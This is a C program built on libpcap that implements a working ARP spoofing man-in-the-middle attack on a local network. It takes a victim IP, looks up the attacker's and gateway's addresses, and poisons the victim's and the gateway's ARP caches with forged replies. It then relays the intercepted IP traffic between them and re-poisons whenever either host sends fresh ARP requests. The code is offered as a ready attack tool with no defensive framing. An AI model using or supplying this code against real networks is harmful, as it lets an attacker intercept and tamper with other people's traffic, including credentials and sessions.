#include<pcap/pcap.h>
#include<stdio.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<unistd.h>
#include<netinet/in.h>
#include<netinet/ether.h>
#include<netinet/ip.h>
#include<net/ethernet.h>
#include<net/if_arp.h>
#include<stdlib.h>
#include<arpa/inet.h>
#include<string.h>

#define ip 100


int getattackerinfo(sockaddr_in * attacker_ip , unsigned char *attacker_mac , sockaddr_in * gateway_ip, char * dev)
{	
	int sock;
	struct ifreq ifr;
	char gateway[ip]={0,};
	char test[100]={0,};
	FILE * fp;

	sock=socket(AF_INET,SOCK_DGRAM,0);
        if(sock<0)
        {       
                printf("socket fail");
                return -1;
        }       
//attacker's mac_address       
	memset(&ifr,0x00,sizeof(ifr));
	strcpy(ifr.ifr_name, (const char *)dev);
	printf("%s\n",ifr.ifr_name);
        ifr.ifr_addr.sa_family=AF_INET;
        if(ioctl(sock,SIOCGIFHWADDR,&ifr) != 0 )
	{
		printf("ioctl error");
		return -1;
	}

	memcpy(attacker_mac,(unsigned char *)ifr.ifr_hwaddr.sa_data,ETHER_ADDR_LEN);

//attacker's ip
	if(ioctl(sock, SIOCGIFADDR, &ifr)!=0)
	{
		printf("ioctl error");
		return -1;
	}

	memcpy(attacker_ip,&ifr.ifr_addr,sizeof(sockaddr));
	close(sock);
// gateway ip
	fp=popen("netstat -rn | grep -A 1 Gateway | grep 0.0.0.0 | awk '{print$2}' ","r" );
	if(fp==NULL)
	{
		printf("fail to get gateway");
		return -1;
	}
	
	fgets(gateway,100,fp);

	if( inet_aton((const char*)gateway, &(gateway_ip->sin_addr)) ==0 )
	{
		printf("change dot decimal to big endian fail -gateway_ip");
		return -1;
	}
	pclose(fp);

	return 0;
}


int arp_request(pcap_t * handle, unsigned char * attacker_mac, sockaddr_in * attacker_ip ,in_addr * victim_ip)
{

	struct ether_header ethernet;
	struct ether_arp arp_header;
	unsigned char * arp_reqpack;

	arp_reqpack=(unsigned char *)malloc(sizeof(ether_arp)+sizeof(ether_header));
	
	memcpy(ethernet.ether_shost,attacker_mac,ETHER_ADDR_LEN);
	ether_aton_r("ff:ff:ff:ff:ff:ff",(ether_addr *)ethernet.ether_dhost);
	ethernet.ether_type= (unsigned int)htons(0x0806);

	memcpy(arp_reqpack,&ethernet,sizeof(struct ether_header));
	

	arp_header.arp_hrd=htons(ARPHRD_ETHER);
	arp_header.arp_pro=htons(ETHERTYPE_IP);
	arp_header.arp_hln=ETHER_ADDR_LEN;
	arp_header.arp_pln=sizeof(struct in_addr);
	arp_header.arp_op=htons(ARPOP_REQUEST);
	memcpy(arp_header.arp_sha,attacker_mac,ETHER_ADDR_LEN);
	ether_aton_r("00:00:00:00:00:00",(ether_addr *)arp_header.arp_tha);
	memcpy(arp_header.arp_spa,&attacker_ip->sin_addr,sizeof(in_addr));
	memcpy(arp_header.arp_tpa,victim_ip,sizeof(in_addr));	
	memcpy(arp_reqpack+14,&arp_header,sizeof(ether_arp));
	while(1)
	{
		if(pcap_sendpacket(handle, arp_reqpack, sizeof(ether_arp)+sizeof(ether_header)) == 0)
			break;
	}
	free(arp_reqpack);
	return 0;

}


int arp_reply(pcap_t * handle, unsigned char * attacker_mac, unsigned char * victim_mac, in_addr * receiver_ip, in_addr * victim_ip)
{
	struct ether_header ethernet_spoof;
	struct ether_arp arp_header_spoof;
	unsigned char * arp_spoofpack;

	arp_spoofpack=(unsigned char *)malloc(sizeof(ether_arp)+sizeof(ether_header));

	memcpy(ethernet_spoof.ether_shost,attacker_mac,ETHER_ADDR_LEN);
        memcpy(ethernet_spoof.ether_dhost, victim_mac,ETHER_ADDR_LEN);
        ethernet_spoof.ether_type= (unsigned int)htons(0x0806);
        memcpy(arp_spoofpack,&ethernet_spoof,sizeof(struct ether_header));

        arp_header_spoof.arp_hrd=htons(ARPHRD_ETHER);
        arp_header_spoof.arp_pro=htons(ETHERTYPE_IP);
        arp_header_spoof.arp_hln=ETHER_ADDR_LEN;
        arp_header_spoof.arp_pln=sizeof(struct in_addr);
        arp_header_spoof.arp_op=htons(ARPOP_REPLY);
        memcpy(arp_header_spoof.arp_sha,attacker_mac,ETHER_ADDR_LEN);
        memcpy(arp_header_spoof.arp_tha,victim_mac,ETHER_ADDR_LEN);
        memcpy(arp_header_spoof.arp_spa,receiver_ip,sizeof(in_addr));
        memcpy(arp_header_spoof.arp_tpa,victim_ip,sizeof(in_addr));

  	memcpy(arp_spoofpack+14,&arp_header_spoof,sizeof(ether_arp));
	while(1)
	{
		if(pcap_sendpacket(handle, arp_spoofpack, sizeof(ether_arp)+sizeof(ether_header))==0)
			break;
	}
	free(arp_spoofpack);

	return 0;
}

int arp_request_uni(pcap_t * handle, unsigned char * attacker_mac, in_addr * fake_ip ,in_addr * dest_ip, unsigned char * dest_mac)
{

	struct ether_header ethernet;
	struct ether_arp arp_header;
	unsigned char * arp_reqpack_uni;

	arp_reqpack_uni=(unsigned char *)malloc(sizeof(ether_arp)+sizeof(ether_header));
	
	memcpy(ethernet.ether_shost,attacker_mac,ETHER_ADDR_LEN);
	memcpy(ethernet.ether_dhost,dest_mac,ETHER_ADDR_LEN);
	ethernet.ether_type= (unsigned int)htons(0x0806);

	memcpy(arp_reqpack_uni,&ethernet,sizeof(struct ether_header));
	

	arp_header.arp_hrd=htons(ARPHRD_ETHER);
	arp_header.arp_pro=htons(ETHERTYPE_IP);
	arp_header.arp_hln=ETHER_ADDR_LEN;
	arp_header.arp_pln=sizeof(struct in_addr);
	arp_header.arp_op=htons(ARPOP_REQUEST);
	memcpy(arp_header.arp_sha,attacker_mac,ETHER_ADDR_LEN);
	ether_aton_r("00:00:00:00:00:00",(ether_addr *)arp_header.arp_tha);
	memcpy(arp_header.arp_spa,fake_ip,sizeof(in_addr));
	memcpy(arp_header.arp_tpa,dest_ip,sizeof(in_addr));	
	memcpy(arp_reqpack_uni+14,&arp_header,sizeof(ether_arp));
	while(1)
	{	
		if(pcap_sendpacket(handle, arp_reqpack_uni, sizeof(ether_arp)+sizeof(ether_header)) == 0)
			break;
	}
	free(arp_reqpack_uni);
	return 0;

}

int find_arp_request_n_ip_relay(pcap_t * handle, unsigned char * attacker_mac, sockaddr_in * attacker_ip, in_addr * source_ip1, in_addr * source_ip2, unsigned char * source_mac1, unsigned char * source_mac2)
{
	int result;
	struct pcap_pkthdr * header;
	const u_char *data;
	iphdr * cmp_ip;	
	ether_header * cmp_ethernet;
	ether_arp * cmp_arp;
	
	
	while(1)
	{	

		result=pcap_next_ex(handle, &header, &data);
		if(result != 1)
		{
			continue;
		}
	
		cmp_ethernet=(ether_header *)data;

		if(ntohs(cmp_ethernet->ether_type) !=0x0806)
		{
			if(ntohs(cmp_ethernet->ether_type) != 0x0800)
			{
				
				 continue;
			}

			cmp_ip=(iphdr *)(data+14);

			if(memcmp(&cmp_ip->saddr,source_ip1,sizeof(in_addr)) ==0  && memcmp(cmp_ethernet->ether_shost,source_mac1,sizeof(ETH_ALEN)) ==0 && memcmp(&cmp_ip->daddr,&attacker_ip->sin_addr,sizeof(in_addr)) !=0 && memcmp(cmp_ethernet->ether_dhost, attacker_mac,sizeof(ETH_ALEN)) == 0)
			{
							
				u_char * pktdata= (u_char *)malloc(ntohs(cmp_ip->tot_len)+14);
				memcpy(pktdata, data, ntohs(cmp_ip->tot_len)+14);
				cmp_ethernet=(ether_header *)pktdata;
				
				for(int i=0;i<6;i++) 
				{
					cmp_ethernet->ether_shost[i]=attacker_mac[i];
					cmp_ethernet->ether_dhost[i]=source_mac2[i];	
				}
				
				
				while(1)
				{
			

					if(pcap_sendpacket(handle, pktdata, ntohs(cmp_ip->tot_len)+14) == 0)
					{	
						free(pktdata);
						break;
					}
					
				}

				
			}
			else if(memcmp(&cmp_ip->daddr,source_ip1,sizeof(in_addr)) ==0 &&memcmp(cmp_ethernet->ether_shost,source_mac2,sizeof(ETH_ALEN)) ==0 && memcmp(cmp_ethernet->ether_dhost,attacker_mac, sizeof(ETH_ALEN)) ==0 )
			{

				u_char * pktdata= (u_char *)malloc(ntohs(cmp_ip->tot_len)+14);
				memcpy(pktdata, data, ntohs(cmp_ip->tot_len)+14);
				cmp_ethernet=(ether_header *)pktdata;

				for(int i=0;i<6;i++)
				{
					cmp_ethernet->ether_shost[i]=attacker_mac[i];
					cmp_ethernet->ether_dhost[i]=source_mac1[i];	
				}

				while(1)
				{  
					if(pcap_sendpacket(handle, pktdata, ntohs(cmp_ip->tot_len)+14) == 0)
					{		
						free(pktdata);
						break;
					}
					
				}

				
			}
	
			continue;			
		}

	
		cmp_arp=(ether_arp *)(data+14);
	
		if(ntohs(cmp_arp->arp_op) != ARPOP_REQUEST)
		{
			continue;
		}

		if(memcmp(cmp_arp->arp_tpa, source_ip1,sizeof(in_addr)) != 0 && memcmp(cmp_arp->arp_tpa,source_ip2,sizeof(in_addr)) != 0)
			continue;
	
		if(memcmp(cmp_arp->arp_spa, source_ip1,sizeof(in_addr)) == 0)
		{
			
			if(memcmp(cmp_ethernet->ether_dhost, attacker_mac,sizeof(ETH_ALEN)) ==0 ){
				arp_reply(handle,attacker_mac, cmp_ethernet->ether_shost, source_ip2, source_ip1);
				printf("victim UNICAST recovery.\n");

			continue;
			}
			else
			{
				arp_request_uni(handle, attacker_mac, source_ip2, source_ip1, source_mac1);
				arp_request_uni(handle, attacker_mac, source_ip1, source_ip2, source_mac2); 
				printf("victim BROADCAST recovery.\n");
			}
				
			continue;
		}

		if(memcmp(cmp_arp->arp_spa,source_ip2,sizeof(in_addr)) == 0)
		{
			if(memcmp(cmp_ethernet->ether_dhost, attacker_mac,sizeof(ETH_ALEN)) ==0)
			{
				arp_reply(handle,attacker_mac, cmp_ethernet->ether_shost, source_ip1, source_ip2);
				printf("gateway UNICAST recovery.\n");
			}
			else
			{
				arp_request_uni(handle, attacker_mac, source_ip2, source_ip1, source_mac1);
				arp_request_uni(handle, attacker_mac, source_ip1, source_ip2, source_mac2); 
				printf("gateway BROADCAST recovery.\n");
			}
			continue;
		}

	}

	return 0;	
}





int main(int argc, char * argv[])
{

	char * dev, errbuf[PCAP_ERRBUF_SIZE];
	pcap_t * handle;
	struct pcap_pkthdr * header;
	struct ether_header ethernet;
	struct ether_arp arp_header;
	struct ether_header ethernet_spoof;
	struct ether_arp arp_header_spoof;
	struct sockaddr_in * attacker_ip=NULL;
	unsigned char * attacker_mac=NULL;
	unsigned char * victim_mac=NULL;
	unsigned char * gateway_mac=NULL;
	struct sockaddr_in * gateway_ip=NULL;
	const u_char *data;
	int result,t;
	struct in_addr victim_ip;
	ether_header * cmp_ethernet;
	ether_arp * cmp_arp;
	int check=0;
	int val=0;
	victim_mac=(unsigned char *)malloc(ETH_ALEN);
	gateway_mac=(unsigned char *)malloc(ETH_ALEN);
	attacker_ip=(sockaddr_in *)malloc(16);
	gateway_ip=(sockaddr_in *)malloc(16);
	attacker_mac=(unsigned char  *)malloc(ETH_ALEN);
	


	inet_aton(argv[1],&victim_ip);
	dev=pcap_lookupdev(errbuf);
	if(dev == NULL)
	{
		fprintf(stderr,"fail to find device: %s\n",errbuf);
		return -1;
	}

	handle=pcap_open_live(dev,BUFSIZ,0,1000,errbuf);

	if(handle==NULL)
	{
		fprintf(stderr, "fail to open device %s: %s\n", dev, errbuf);
	}

	if(getattackerinfo(attacker_ip,attacker_mac,gateway_ip,dev) !=0)
	{
		printf("fail to get attacker info ");
		return -1;
	}
	
	while(1)                 // get sender mac, receiver mac
	{
		arp_request(handle, attacker_mac, attacker_ip, &victim_ip);
		arp_request(handle, attacker_mac, attacker_ip, &gateway_ip->sin_addr);

		for(t=0;t<100;t++)
		{


			result=pcap_next_ex(handle, &header, &data);
			if(result != 1)
				continue;

			cmp_ethernet=(ether_header *)data;

			if(ntohs(cmp_ethernet->ether_type) !=0x0806)
				continue;

			cmp_arp=(ether_arp *)(data+14);
	
			if(ntohs(cmp_arp->arp_op) != ARPOP_REPLY)
				continue;

			if(memcmp(cmp_arp->arp_spa, &victim_ip,sizeof(in_addr)) == 0)
			{	
					
				memcpy(victim_mac ,cmp_arp->arp_sha,ETHER_ADDR_LEN);
				check++;
			}

			if(memcmp(cmp_arp->arp_spa,&gateway_ip->sin_addr,sizeof(in_addr)) == 0)
			{
				memcpy(gateway_mac, cmp_arp->arp_sha,ETHER_ADDR_LEN);
				check ++;			
			}
			if(check == 2)
				break;
		}
		
		if(t==100 && check != 2)
		{	
			continue;
			check = 0;
		}

		break;
	}
	

	
	 arp_reply(handle, attacker_mac, victim_mac, &gateway_ip->sin_addr, &victim_ip);   // sender arp_spoofing attack
	
	 arp_reply(handle, attacker_mac, gateway_mac, &victim_ip, &gateway_ip->sin_addr);     // receiver arp_spoofing attack
	

	find_arp_request_n_ip_relay(handle, attacker_mac, attacker_ip, &victim_ip, &gateway_ip->sin_addr,victim_mac,gateway_mac);
		

   
	return 0;

}
